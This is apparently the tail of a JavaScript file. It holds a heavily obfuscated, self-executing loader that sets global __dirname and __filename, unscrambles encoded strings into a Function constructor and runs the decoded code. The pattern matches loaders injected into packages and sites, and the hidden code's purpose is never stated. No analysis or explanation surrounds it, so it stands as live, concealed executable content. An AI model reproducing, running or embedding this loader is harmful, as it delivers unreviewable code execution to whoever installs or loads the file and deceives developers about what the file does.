__dirname!== _$_e0b7[0x0]){global[_$_e0b7[0x14]]= __dirname};if( typeof __filename!== _$_e0b7[0x0]){global[_$_e0b7[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
